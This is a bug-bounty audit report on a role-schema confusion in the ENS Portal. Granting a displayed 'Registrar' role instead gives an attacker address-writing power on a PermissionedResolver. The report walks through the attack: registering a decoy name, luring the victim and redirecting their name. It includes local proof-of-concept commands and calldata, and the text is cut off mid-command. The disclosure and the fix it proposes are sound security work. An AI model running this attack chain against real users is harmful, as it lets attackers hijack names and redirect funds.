# 92112 w a critical a direct registry url applies registry bit 0 to a resolver and grants address control

**Submitted on Sep 7th 2026 at 09:15:17 UTC by @yaohao159123 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92112
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

An attacker does not need to deploy a malicious contract, persuade the victim to paste an address, or race a transaction. The attacker needs one ordinary `.eth` registration and a contract-type confusion already present in ENS Portal.

The attacker publicly registers a decoy name through ETHRegistrar, gives that name to the victim, and places the victim's legitimate Portal-deployed PermissionedResolver P in the decoy's `subregistry` field. Registry discovery and indexer materialization reduce P to a bare address. The attacker then sends the victim Portal's public `/registry/P/roles` URL directly. That route treats the address as a Registry without verifying the implementation behind it, renders Registry permission labels, enables Add User, and builds a transaction for the selected Registry role.

That last step crosses a semantic boundary hidden from the victim. Bit 0 means `ROLE_REGISTRAR` ("Registrar / Can register new labels") on an ENSv2 Registry, but the same bit means `ROLE_SET_ADDR` on a PermissionedResolver. Both contract types accept the same EnhancedAccessControl entrypoint, `grantRootRoles(uint256,address)`. The victim therefore selects only the apparently narrow Registrar permission and confirms once, while Portal sends `grantRootRoles(1, attacker)` to P. The call succeeds and gives the attacker resolver-wide address-writing authority. Before the grant the attacker has no role and cannot call `setAddr`; after it, the attacker redirects the victim's real `vladz.eth` record to an attacker-controlled address.

The vulnerability is the Portal's wrong-schema authorization: it presents one capability but commissions another by binding Registry semantics to an unverified contract address. The effect is a proven capability transition from false to true, not a harmless label error and not generic untyped routing.

## Vulnerability Details

The security invariant is simple: the permission vocabulary shown to a user must describe the capabilities implemented by the contract that will receive the transaction. An address is not a contract type. When multiple EnhancedAccessControl contracts share a selector and bitmap positions but assign different powers to those positions, the application must verify the target's contract kind before it renders a role or prepares a grant. Portal instead lets discovery and indexer classification stand in for that verification.

The attacker journey exploits each state transition produced by that design: choose a semantic collision, place the victim's resolver into a public discovery path, let Portal erase its type, induce one normal Add User action, and exercise the broader resolver capability that the transaction actually created.

#### Select the semantic collision

The attacker chooses bit 0 because the user-facing meaning and the executed meaning diverge while the call interface remains valid:

| Property            | ENSv2 Registry shown by Portal                           | PermissionedResolver targeted by Portal           |
| ------------------- | -------------------------------------------------------- | ------------------------------------------------- |
| bit 0 user role     | `ROLE_REGISTRAR` - "Registrar / Can register new labels" | `ROLE_SET_ADDR` - write any name's address record |
| bit 0 admin variant | `ROLE_REGISTRAR_ADMIN` (bit 128)                         | `ROLE_SET_ADDR_ADMIN` (bit 128)                   |
| grant entrypoint    | `grantRootRoles(uint256,address)`                        | `grantRootRoles(uint256,address)`                 |
| shared selector     | `0x072d5d77`                                             | `0x072d5d77`                                      |

This is why the wrong-schema transaction does not revert. Registry code and resolver code agree on how to decode the call, but disagree on what bitmap `1` authorizes. Portal labels the choice with the Registry definition; P enforces the PermissionedResolver definition.

The contracts establish the consequence but are not the reported defect. ENSv2 `RegistryRolesLib.sol` defines Registry bit 0 as `ROLE_REGISTRAR`; `PermissionedResolverLib.sol` defines resolver bit 0 as `ROLE_SET_ADDR`; `PermissionedResolver.sol` requires `ROLE_SET_ADDR` to write address records; and `EnhancedAccessControl.sol` provides the common grant sink. The vulnerable trust decision and minimum repair both sit in the in-scope Portal.

A separately executed variant confirms that the schema substitution is not confined to bit 0. Portal also offers `ROLE_REGISTER_RESERVED` as "Register Reserved"; frozen ENSJS `5.0.0-alpha.1` maps it to bitmap `16` and, when executed with root resource zero, returns `grantRootRoles(16, attacker)` for P. In `PermissionedResolverLib.sol`, bitmap `16` is `ROLE_SET_TEXT`. A local EVM test deployed the real PermissionedResolver behind its real proxy factory: the attacker could not call `setText` before the Portal-shaped grant, acquired root `ROLE_SET_TEXT` from that grant, and then wrote the text value successfully. The primary report remains the stronger bit-0 address redirect, while this different selected role supplies independent runtime confirmation of the same unverified-schema root cause.

#### Materialize the target and use the direct Registry URL

The starting state is legitimate: the victim owns `vladz.eth`, uses Portal-deployed PermissionedResolver P, and received the all-roles admin bitmap when Portal's normal Change Resolver flow initialized P. The attacker starts with no role on P.

The attacker then prepares the route entirely through public operations over attacker-funded assets:

1. Register an ordinary decoy `.eth` name with the public `ETHRegistrar.commit()` / `register()` flow.
2. Set the victim as the decoy's owner and P as its `subregistry`. The public registrar permits a nonzero third-party owner and an arbitrary nonzero subregistry address, and the ETH Registry stores that pointer and emits `SubregistryUpdated` without checking the target's contract type.
3. Let Universal Resolver registry discovery (`findRegistries`) include the bare address P in the decoy's registry ancestry.
4. Let the ENSv2 indexer follow its documented heuristic that a new address observed through `SubregistryUpdated` indicates a dynamically deployed registry and consequently materialize P as a registry.
5. Send the victim Portal's direct `/registry/P/roles` URL and ask the victim to add the attacker as an operator for the gifted decoy, presenting the request as ordinary delegated administration of the newly delivered name.

The victim opens the direct URL inside Portal. The destination calls P a "PermissionedRegistry," renders Registry permissions, and enables Add User because the victim genuinely holds bit-128 admin authority on P. The victim enters the attacker address, selects only "Registrar / Can register new labels," and confirms once. The hash-verified frozen route was executed with three local query states: before materialization it returned `Registry not found`; after a row for P existed and the caller held the admin bit, it rendered the roles table and enabled Add User with both components bound to P; with the same row but a non-admin caller, it withheld Add User.

The discovery half cannot be replaced with a resolver-only pointer. A local EVM experiment ran the real `LibRegistry.findRegistries` against identical `decoy.eth` trees. With P only in `getResolver("decoy")`, ancestry element zero was the zero address; with P in `getSubregistry("decoy")`, element zero was P. The public decoy must remain subregistry-driven, but navigation after materialization can be direct.

Portal submits `P.grantRootRoles(1, attacker)`. P interprets bit 0 as `ROLE_SET_ADDR`, so the attacker can immediately call `setAddr(namehash(vladz.eth), attackerAddress)`. The genuine name then resolves to the attacker.

No step requires a victim-pasted contract address, Retry sequence, failure or revert in the victim flow, transaction race, attacker-deployed resolver, compromised key, or pre-existing attacker permission. Registration is attacker preparation; the victim-side trigger is one documented Add User operation and one successful wallet approval. The final redirect needs no further victim action.

#### Let the route erase the target's contract type

The exploitable trust boundary starts when a typed PermissionedResolver becomes an address and ends when that address receives calldata constructed from the Registry schema:

1. `apps/portal/src/features/registry/hooks/useNameRegistryDiscovery.ts:56` calls ENSJS registry discovery in `getNameRegistries` and returns addresses without an implementation, interface, or contract-kind field.
2. After materialization, the public `/registry/$address/roles` route accepts that same bare address as its only target identifier; the URL carries no implementation or contract-kind binding.
3. `apps/portal/src/routes/registry/$address/roles.tsx:31` uses `getRegistryInfo(address)` as its complete type gate. A returned indexer row is enough to treat the target as a Registry. The requested `RegistryInfo` fields at `apps/portal/src/features/registry/hooks/useRegistry.ts:39` are `address`, `name`, `namehash`, `parentRegistry`, `createdBlock`, and `createdAt`; none proves an implementation or contract kind.
4. The route checks Registry `ROLE_REGISTRAR_ADMIN` against the untyped target at line 40 and enables Add User at line 77. `apps/portal/src/features/registry/hooks/useRegistryRoles.ts:47` reads role rows for the same address and decodes them using Registry vocabulary.
5. `apps/portal/src/lib/roles/permissions.ts:93` presents bit 0 as `Registrar` with `Can register new labels`. `apps/portal/src/features/registry/components/v2/RegistryAddUserSheet.tsx` renders that Registry schema and snapshots `{ account, roles }` for submission.
6. `apps/portal/src/features/registry/helpers/grantRegistryRoles.ts:45` fixes the resource to `ROOT_RESOURCE = 0n`; line 80 sets `to` to the unverified route address.
7. The pinned ENSJS implementation maps resource zero to `functionName: 'grantRootRoles'` with `args: [roleBitmap, account]` at `node_modules/@ensdomains/ensjs/src/actions/wallet/v2/grantRoles.ts:49,53`. It maps `ROLE_REGISTRAR` to `1n << 0n` at `node_modules/@ensdomains/ensjs/src/utils/v2/roles/registryRoles.ts:2`.

The attacker-controlled data reaches the authority-changing sink as follows:

```
typed PermissionedResolver P
  -> attacker places P in a public subregistry field (real ETHRegistrar register)
  -> indexer lists bare P as a registry
  -> victim opens /registry/P/roles directly; route applies the Registry role schema
  -> UI offers bit 0 as "Registrar / Can register new labels"
  -> Portal sends grantRootRoles(1, attacker) to P
  -> P interprets bit 0 as ROLE_SET_ADDR
  -> attacker setAddr(vladz.eth) succeeds; genuine victim name redirected
```

At no point between discovery and transaction construction does Portal restore or verify the lost type information. The indexer row determines presentation, the route address determines the recipient, and the Registry bitmap determines the calldata.

#### Walk past a resolver check that already exists

Portal already knows how to identify this exact target type. `apps/portal/src/features/resolver/hooks/useIsPermissionedResolver.ts` reads the EIP-1967 implementation slot `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`, decodes it, and compares the result with the known `ensPermissionedResolverImpl` address.

Resolver-facing application paths use that implementation-aware check: `apps/portal/src/routes/$name/resolver.tsx`, `ResolverCard.tsx`, `ResolverType.tsx`, `useCanEditRecords.ts`, and `useResolverName.ts`. The worker has the same protection in `apps/portal/src/worker/ens.ts:92-123` through `fetchIsPermissionedResolver`, using the same slot and comparison.

The Registry roles route never invokes it. `apps/portal/src/routes/registry/$address/roles.tsx` renders Registry labels and enables the grant without asking whether `$address` is a PermissionedResolver. In the reproduced run, the target's EIP-1967 implementation equals the known resolver implementation, so the existing check would have identified it. Applying that check, or an equivalent supported-implementation/interface verification, before Registry presentation and actions is the minimum targeted fix.

#### Convert an indexing hint into a transaction authorization

Official indexing documentation in `docs/indexing-ensv2-events.md` describes `SubregistryUpdated` with this exact sentence: "New subregistry addresses indicate dynamically deployed `UserRegistry` contracts for subnames." The word "indicate" describes a watch-list heuristic, not proof that every observed address implements a Registry. The document uses symmetric indication language for `ResolverUpdated` and PermissionedResolvers.

Even if an indexer classified every address accurately, the Portal-side defect would remain: Portal's discovery result contains only addresses; the app creates `/registry/<address>/roles` itself; the route requests no contract-kind proof; and the transaction builder does no on-chain verification before applying Registry semantics. Here, a heuristic row becomes the entire authorization to display and transact with the Registry schema. The in-scope application must enforce the type boundary rather than treating indexing reachability as certification.

#### Run the attack against the frozen Portal

The reproduced chain used the clean `audit-comp-ready` Portal revision `1c9b47f18fcddd2e864dfe385c4171061c9811ae` and real deployed ENSv2 contracts on a local Anvil Sepolia fork. The fork was pinned at block 11600064 and used chain ID 11155111. No public Sepolia transaction was broadcast; the verifier also queried a public archive endpoint and confirmed the register hash was absent.

The target P was the real PermissionedResolver proxy `0xa9a5c3bf02eac02ac6e0e5e4ecb5ea3e4d631308`, whose EIP-1967 implementation was `0x9eae5c2730a7dd16bdd1dee6421a1b91e3b0365e`.

Four attacker-key-signed setup transactions exercised the actual public ingress: USDC mock mint, ETHRegistrar approval, `commit()` transaction `0x83c00af318d9325ad8a99d21a5150fd44cf872b7e7bde8ca97255d4e877379b3` at block 11600067, and `register()` transaction `0x40d81e38bc0c134e40619ec49b34e3e657f475a182d8037da32cd940ce32c8d7` at block 11600069. Registration created the fresh victim-owned decoy with P as subregistry and resolver, emitting `NameRegistered` and `SubregistryUpdated`.

Starting from a fresh database, the pinned ENSv2 indexer replayed naturally from the v2 deployment block through 11533026, including the victim's historical root-role rows. A backup was taken and a disclosed cursor-only checkpoint advance changed only three sync/index cursors, with zero manual row inserts. The unmodified binary then processed the registration block and materialized P as a registry. Because its API schema predates the frozen Portal schema, a read-only compatibility adapter served `getRegistryInfo` and `getRegistryRoles` directly from the materialized SQLite database. That adapter is not claimed as primary reachability evidence; the indexer's database write is.

The direct-route run used Node `v22.23.2`, esbuild `0.28.1`, Foundry `1.7.1`, Solc `0.8.35`, and an ephemeral local Anvil chain. It executed the hash-verified Portal route and actual ENSJS builder against one locally deployed real PermissionedResolver proxy. Direct `/registry/P/roles` navigation enabled Add User after an injected materialized row; the displayed `Registrar / Can register new labels` selection made ENSJS produce `grantRootRoles(1, attacker)` and calldata beginning `0x072d5d77`. That exact calldata was sent from the local admin account and mined successfully as transaction `0xfa55eeedce4b46f030622fe6cc37adf6531e4c02e4e164623f2b224c16eea48d`. Before the grant, attacker `setAddr` reverted and `addr(victim.eth)` was zero. After the grant, the attacker held root `ROLE_SET_ADDR`, sent successful transaction `0x18513b5499e1cc27816b273fc4e8a76da95800abb90c39b755cadd4f732e0147`, and changed the resolver output to the attacker address. A separate verifier passed 20/20 links across the route target, Add User target, ENSJS output, mined input, receipts, signer, role delta, and final resolver output. The bit-4 `ROLE_SET_TEXT` run remains supporting evidence only. No public-chain request was made.

#### Bound what the evidence does and does not show

* The proof is an explicitly segmented composition: real attacker-signed ETHRegistrar ingress and indexer materialization establish the precondition; the self-contained PoC embedded below then executes the direct Registry URL, the ENSJS builder, the local grant, and the attacker write. It is not presented as an uninterrupted production-indexer lifecycle.
* Natural indexer replay reached block 11533026 before a consistent backup and the cursor-only advance. Only three cursors changed, there were no manual row inserts, and the unmodified indexer processed the actual registration block.
* A staging indexer cannot ingest a local fork event by construction. No public Sepolia writes occurred, and the public-Sepolia negative control found no register transaction.
* The victim intentionally adds the attacker as operator of a gifted decoy; this social premise is required and is not hidden.
* A legitimate root admin can revoke the role and repair the address record after detection. That affects severity assessment but does not prevent the wrong grant or the immediate redirect.
* The PoC's victim signature is mediated by the target-provided mock wallet using an impersonated local-fork account. The captured wallet-request bytes, which exactly match the mined input, are the evidence.
* The contracts and indexer serve only as consequence and reachability oracles. The defect and minimum fix are in Portal.
* The direct-route/bit-0 proof is segmented and bounded. The Portal component receives an injected materialized row rather than a live indexer response, but the actual ENSJS calldata is then sent to the same locally deployed PermissionedResolver proxy and both wallet transactions have successful receipts. It proves the address-writing impact without being described as a continuous production browser-to-indexer run.

These boundaries avoid attributing production behavior to a fork or compatibility adapter while retaining the proven application decision: the real Portal produced and completed the resolver grant after showing the victim a Registry permission.

#### Stop the exploit at the schema boundary

1. Verify the target contract kind on the Registry roles route before showing Registry vocabulary or enabling Registry actions. At minimum, call the existing implementation-aware `useIsPermissionedResolver` check and reject a known resolver implementation; preferably allow only verified supported Registry implementations or a Registry-specific interface.
2. Preserve a typed contract-kind/schema identity across ENSJS `findRegistries`, the indexer `RegistryInfo` model, route state, and transaction construction instead of collapsing the target to a bare address.
3. Refuse transaction preparation whenever the verified target schema differs from the permission vocabulary displayed to the user.
4. Add a regression test that routes a PermissionedResolver through registry discovery and proves Registry labels and actions are absent and `grantRootRoles` cannot be prepared through a Registry flow.

The first control blocks the demonstrated path at its narrowest application boundary; the remaining controls keep the same type confusion from reappearing elsewhere in the dataflow.

## Impact Details

Selected Websites & Applications impact rows:

* Primary (Critical): **Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters / Substituting contract addresses / Submitting malicious transactions.** Portal presents the narrow Registry permission "Registrar / Can register new labels," but its unverified target selection makes the corresponding bitmap execute as resolver-wide Set Address authority. The connected wallet receives one Portal-built `grantRootRoles(1, attacker)` transaction to a PermissionedResolver. By substituting an entire role schema, the application changes the decisive authorization semantics relative to its own display and submits the broader grant.
* Secondary: **Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient.** The displayed permission says Registrar while the target interprets the submitted bit as Set Address. Both the represented capability and the contract-type premise behind the transaction detail are materially wrong.

The measurable impact is new attacker authority, not merely confusion. Before the victim acts, the attacker has no bit-0 role and `setAddr` reverts. Portal's one successful transaction changes `ROLE_SET_ADDR` from false to true. The attacker then redirects the victim's genuine `vladz.eth` to an attacker-controlled address while Universal Resolver continues to use P. Because the grant is at P's root resource, every name covered by that resolver's root scope is exposed; the authority is not limited to the decoy shown to the victim.

Severity is Critical. The report does not claim irreversible loss: once the compromise is noticed, a legitimate root admin can revoke the role and restore the record. Reversibility does not stop the immediate capability grant, does not warn the user before confirmation, and does not require the attacker to obtain any further victim interaction before redirecting records.

## References

Scope, source, and public-state links below returned HTTP 200 when verified on 2026-09-01:

* In-scope `apps/portal` Explorer application: <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* Program scope: <https://immunefi.com/audit-competition/audit-competition-ens/scope/>
* Registry roles route containing the type gate, admin check, and Add User enablement: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/routes/registry/$address/roles.tsx>
* Existing implementation-aware PermissionedResolver check omitted by that route: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/features/resolver/hooks/useIsPermissionedResolver.ts>
* Worker implementation of the same EIP-1967 check: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/worker/ens.ts>
* Registry bit-0 permission vocabulary: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/lib/roles/permissions.ts>
* Grant helper with a fixed root resource and untyped `to`: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/features/registry/helpers/grantRegistryRoles.ts>
* Portal-generated `/registry/<address>/roles` link from discovery element zero: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/features/registry/components/v2/NameRegistryRolesOverviewTable.tsx>
* Indexer-backed `RegistryInfo` without a contract-kind field: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/features/registry/hooks/useRegistry.ts>

The public-state refresh on 2026-09-01 found `audit-comp-ready` at `1c9b47f18fcddd2e864dfe385c4171061c9811ae` through `git ls-remote https://github.com/immunefi-team/audit-comp-ens`. This is the exact PoC revision. The only pull ref was PR #1, a Hono dependency bump unrelated to the Portal Registry-role/type path. The 59-entry public Known Issues list dated 2026-08-14 was checked again on 2026-09-01 for the Registry roles page, indexer type classification, PermissionedResolver treatment, and role bitmap schemas; no exact or near match was found. Private-report overlap cannot be observed and is not claimed.

## Proof of Concept

### Security claim established

The self-contained PoC embedded in this report proves the direct victim navigation trigger and its Critical impact. After public ingress has made P discoverable and materialized, the victim enters the first-party `/registry/P/roles` route directly. The executed Portal component binds both the role table and Add User sheet to P, while the actual ENSJS builder converts the displayed Registrar choice into bit-0 `grantRootRoles(1, attacker)` calldata.

That exact calldata is joined to real local receipts on one PermissionedResolver proxy. Before the grant, the attacker has no root bit 0 and `setAddr(victim.eth)` reverts. The grant receipt succeeds, root `ROLE_SET_ADDR` becomes true, and the attacker-signed `setAddr` receipt succeeds, changing the resolver output from zero to the attacker. The regenerated independent verifier passes all 20 target, schema, calldata, receipt, signer, role-transition, and terminal-state checks.

Every write is local. The embedded PoC makes no public RPC request and contacts no production service. It deliberately begins after materialization and independently verifies the route decision, generated calldata, successful grant, role transition, attacker write, and final resolver output.

### Evidence chain and reproduction layout

The evidence joins four independently inspectable segments:

1. hash-verified execution of the direct Registry route with missing-row, admin-row, and non-admin controls;
2. execution of the actual ENSJS bit-0 builder used by Portal;
3. local EVM execution against a real PermissionedResolver proxy, including pre-grant denial, the raw-calldata grant, attacker `setAddr`, and both successful receipts; and
4. an independent 20/20 verifier linking the route target, displayed role, calldata, signer, role transition, and final resolver output.

The final report embeds these 15 files byte-for-byte below: the environment declaration, exact reproduction commands, `setup.sh`, portable `foundry.toml.template`, `run_portal_harness.sh`, the complete 365-line Portal component harness, the executed ENSJS `grantRoles.ts` builder, the executed Registry role constants, the complete 214-line Solidity test, the complete receipt verifier, the 20-check entrypoint, sanitized builder evidence, local receipt evidence, fresh Forge output, and the regenerated verdict.

### Prerequisites and run commands

The bounded proof has no unstated local dependency. It requires Bash, Node 22, `realpath`, `jq`, and Foundry (`forge`, `anvil`, `cast`); an official `audit-comp-ens` checkout at commit `1c9b47f18fcddd2e864dfe385c4171061c9811ae` with locked pnpm dependencies; and an ENSv2 `contracts-v2` checkout at commit `48b3e2d39513b9dd32ef1850877a29009bc807b9` with submodules initialized. `PORTAL_ROOT` points to `apps/portal`; `CONTRACTS_ROOT` points to `contracts-v2/contracts`. No archive RPC, Docker image, Python package, browser, public chain, or production endpoint is needed for this bounded route.

Create both fixed source checkouts from the same empty directory before running the proof:

```sh
git clone https://github.com/immunefi-team/audit-comp-ens.git audit-comp-ens
git -C audit-comp-ens checkout --detach 1c9b47f18fcddd2e864dfe385c4171061c9811ae
pnpm --dir audit-comp-ens install --frozen-lockfile

git clone --recurse-submodules https://github.com/ensdomains/contracts-v2.git contracts-v2
git -C contracts-v2 checkout --detach 48b3e2d39513b9dd32ef1850877a29009bc807b9
git -C contracts-v2 submodule update --init --recursive
```

Setup and all bounded checks run from the directory where the embedded files are saved:

```sh
export PORTAL_ROOT=./audit-comp-ens/apps/portal
export CONTRACTS_ROOT=./contracts-v2/contracts

bash setup.sh
bash run_portal_harness.sh
forge test -vvv | tee evidence/forge_output.txt
bash run_20_checks.sh
```

`setup.sh` rejects wrong commits or missing declared files and generates `foundry.toml` from a portable template. `run_portal_harness.sh` resolves the installed Vite/esbuild package through `realpath`; the harness then checks fixed SHA-256 values for the Registry route, permission vocabulary, Registry role constants, and ENSJS builder before executing them. The `REPRODUCE.md` block below contains every local Anvil deployment, proxy initialization, Portal builder, raw-calldata grant, attacker `setAddr`, state-read, and verifier command, including the standard public Anvil development keys.

### Execution sequence and witnesses

1. `evidence/portal_builder.json` records the executed direct route. With no materialized row, the route produces Not Found and no Add User. With a P row and admin state, it binds both table and sheet to P and enables Add User; non-admin state suppresses the action. The hash-verified ENSJS builder records `functionName = grantRootRoles`, arguments `[1, attacker]`, and calldata `0x072d5d77000000000000000000000000000000000000000000000000000000000000000100000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8`.
2. `evidence/local_receipt.json` joins that exact builder output to proxy `0xe17482932D009e08429BEb786Ca4EC4490A4743D`. Before the grant, attacker root bit 0 is false, `addr(victim.eth)` is zero, and attacker `setAddr` reverts. Grant transaction `0xfa55eeedce4b46f030622fe6cc37adf6531e4c02e4e164623f2b224c16eea48d` is mined at local block 4 with status 1 and byte-identical input. Attacker-signed transaction `0x18513b5499e1cc27816b273fc4e8a76da95800abb90c39b755cadd4f732e0147` is mined at block 5 with status 1 and changes the resolver output to `0x70997970C51812dc3A010C7d01b50e0d17dc79C8`.
3. `test/ExecutedRouteSearch.t.sol` and `evidence/forge_output.txt` record three passing local EVM tests: the bit-0 transition, resolver-only discovery rejection versus subregistry discovery success, and the supporting bit-4 `ROLE_SET_TEXT` collision. The suite result is 3 passed, 0 failed, 0 skipped.
4. `verify_receipts.mjs` generated `evidence/verdict.json` and passed 20/20 checks over builder verdict, route/table/sheet target identity, displayed Registrar role, bitmap 1, root-grant function, recipient, byte-identical mined input, both receipts, signer, pre/post role state, contract-test result, and terminal resolver output.

All transaction hashes above identify local Anvil transactions, not public Sepolia transactions.

### Embedded PoC integrity

This report is self-contained. Save each block below under its stated portable relative filename to reconstruct the executable proof; every file consumed by the setup, component execution, contract test, and 20-check verifier is present. External source checkouts are the two explicitly versioned dependencies declared in `README.md`.

The following table binds each embedded block to the independently executed bundle copy:

| Embedded file                    | SHA-256                                                            |
| -------------------------------- | ------------------------------------------------------------------ |
| `README.md`                      | `5673741ad8e2a45ebad7100fcd002a09face8a69d6cc192fad86b9ad56aa2607` |
| `REPRODUCE.md`                   | `6b2d237b97abcc24e65ffcfd0378b10215da77e2e1351736cc70e493b9cb603e` |
| `setup.sh`                       | `fb348b511e411cb12860a6248a3e035e38e857a0e497759e19cc537b67409a2f` |
| `foundry.toml.template`          | `a28715976970fdd05b391a32e1a9485bd94318e6087b22b7219fe73e681f77d9` |
| `run_portal_harness.sh`          | `96888ef7294517526376fda0c16b9000cb7e05499d38e67841a1fc51f51fadf6` |
| `portal_route_harness.mjs`       | `ebffe811dbec908657794e0502ad69f1c6695b575f8584798c89d91d22f56ab3` |
| `ensjs/grantRoles.ts`            | `19611dc48504fe51b94c68e9c41145a7159bf371c13a73b4d75dda65dc59da26` |
| `ensjs/registryRoles.ts`         | `074ae91b400735dcde824585cea7386bea3c700be27a8f88c1ed292b08e3d895` |
| `test/ExecutedRouteSearch.t.sol` | `ef4f54078fe3593ef4062ae3bbc1b59bfa3e58cd729dbf04789097acec2a3049` |
| `verify_receipts.mjs`            | `11ba2878f3d30b019cbaa8fc0350054c427a20a018b732ac0e829af859810ad0` |
| `run_20_checks.sh`               | `a6840169989a9b74a172cb81279a350d3a177c1966c168f03985921c4b124dde` |
| `evidence/portal_builder.json`   | `1ab5c52564215794d8a280304dbee09b227db021661c2efab45da37b19ec18c7` |
| `evidence/local_receipt.json`    | `d1a9b906d9157d1df16dd544d8d1babbb76efc51775d1c8e568d9b5b6ff8baa7` |
| `evidence/forge_output.txt`      | `6024689465a958be42bc35807660292c9edbe74d9cc6b983661a36375a7e9ab0` |
| `evidence/verdict.json`          | `4fa605caea8782d1fa2fceb43c8e5ce26c76cc2ae79070903d80169892fa44c2` |

The 15 hashes above bind every file embedded below. No separate manifest, local validation file, private attachment, or unpublished helper is required to execute the reproduction.

**Embedded file: `README.md`**

````markdown
# Direct Registry-Route Bit-0 Proof

This bundle preserves the complete bounded direct-route proof. It executes the
hash-pinned Portal route and actual ENSJS grant builder, runs three local EVM
tests against real ENSv2 contract sources, and independently joins the builder
output to retained local transaction receipts and terminal resolver state.

## Dependencies

- macOS or Linux with Bash, Node 22, `realpath`, `jq`, and Foundry (`forge`,
  `anvil`, `cast`);
- an official `audit-comp-ens` checkout at commit
  `1c9b47f18fcddd2e864dfe385c4171061c9811ae`, with its locked pnpm
  dependencies installed; set `PORTAL_ROOT` to `apps/portal`;
- an ENSv2 `contracts-v2` checkout at commit
  `48b3e2d39513b9dd32ef1850877a29009bc807b9`, with submodules initialized;
  set `CONTRACTS_ROOT` to its `contracts/` directory.

No archive RPC, public chain, production service, browser profile, or real key
is required by this bounded proof. The addresses and private keys in the local
transaction commands are the standard deterministic Anvil development values.

## Setup and checks

```sh
export PORTAL_ROOT=./audit-comp-ens/apps/portal
export CONTRACTS_ROOT=./contracts-v2/contracts

bash setup.sh
bash run_portal_harness.sh
forge test -vvv | tee evidence/forge_output.txt
bash run_20_checks.sh
```

Expected results are three passing Forge tests and `PASS receipt linkage 20/20`.
`setup.sh` rejects incorrect source commits or missing declared files. The
Portal harness independently checks SHA-256 for the route, permission schema,
Registry role constants, and ENSJS builder before executing them.

## Retained local transaction evidence

`evidence/local_receipt.json` records the local Anvil deployment and receipts:

- proxy `0xe17482932D009e08429BEb786Ca4EC4490A4743D`;
- pre-grant bit 0 absent and attacker `setAddr` reverted;
- exact ENSJS calldata mined in grant transaction
  `0xfa55eeedce4b46f030622fe6cc37adf6531e4c02e4e164623f2b224c16eea48d`;
- bit 0 present afterward as resolver `ROLE_SET_ADDR`;
- attacker transaction
  `0x18513b5499e1cc27816b273fc4e8a76da95800abb90c39b755cadd4f732e0147`
  succeeded and set the resolver output to the attacker.

The receipt verifier checks 20 links spanning the Portal target, Add User
sheet, displayed role, actual ENSJS output, mined calldata, signer, receipts,
role transition, Forge test, and final resolver value.

## Files

- `portal_route_harness.mjs`: complete Portal component and actual ENSJS
  execution harness.
- `ensjs/grantRoles.ts` and `ensjs/registryRoles.ts`: hash-matched source
  references for the executed builder and bit definitions.
- `test/ExecutedRouteSearch.t.sol`: complete local contract/discovery test.
- `verify_receipts.mjs`: independent 20-link verifier.
- `foundry.toml.template` and `setup.sh`: portable source configuration.
- `run_portal_harness.sh` and `run_20_checks.sh`: exact entrypoints.
- `evidence/`: sanitized builder output, retained local receipts, fresh Forge
  output, and regenerated verdict.
````

**Embedded file: `REPRODUCE.md`**

````markdown
# Local Receipt Reproduction

The commands below reproduce the retained bit-0 receipt path on a fresh local
Anvil chain. They require the dependencies and environment variables declared
in `README.md`. The two private keys are the public deterministic Anvil
development keys and must never control public assets.

Start Anvil in terminal 1:

```sh
anvil --port 18547 --chain-id 31337 --silent
```

In terminal 2, from this bundle root:

```sh
export PORTAL_ROOT=./audit-comp-ens/apps/portal
export CONTRACTS_ROOT=./contracts-v2/contracts
export LOCAL_RPC=http://127.0.0.1:18547
export ADMIN=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
export ATTACKER=0x70997970C51812dc3A010C7d01b50e0d17dc79C8
export ANVIL_ADMIN_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
export ANVIL_ATTACKER_KEY=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d

bash setup.sh
forge test -vvv | tee evidence/forge_output.txt

forge create \
  "${CONTRACTS_ROOT}/lib/verifiable-factory/src/VerifiableFactory.sol:VerifiableFactory" \
  --rpc-url "${LOCAL_RPC}" --private-key "${ANVIL_ADMIN_KEY}" \
  --broadcast --json

forge create \
  "${CONTRACTS_ROOT}/src/resolver/PermissionedResolver.sol:PermissionedResolver" \
  --rpc-url "${LOCAL_RPC}" --private-key "${ANVIL_ADMIN_KEY}" \
  --broadcast --json --constructor-args "${ADMIN}"

export FACTORY=0x5FbDB2315678afecb367f032d93F642f64180aa3
export IMPLEMENTATION=0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
export PROXY=0xe17482932D009e08429BEb786Ca4EC4490A4743D
export INIT_DATA="$(cast calldata \
  'initialize(address,uint256,bytes[])' \
  "${ADMIN}" 340282366920938463463374607431768211456 '[]')"

cast call "${FACTORY}" \
  'deployProxy(address,uint256,bytes)(address)' \
  "${IMPLEMENTATION}" 777 "${INIT_DATA}" \
  --from "${ADMIN}" --rpc-url "${LOCAL_RPC}"

cast send "${FACTORY}" \
  'deployProxy(address,uint256,bytes)(address)' \
  "${IMPLEMENTATION}" 777 "${INIT_DATA}" \
  --private-key "${ANVIL_ADMIN_KEY}" --rpc-url "${LOCAL_RPC}" --json

TARGET="${PROXY}" CALLER="${ADMIN}" ATTACKER="${ATTACKER}" \
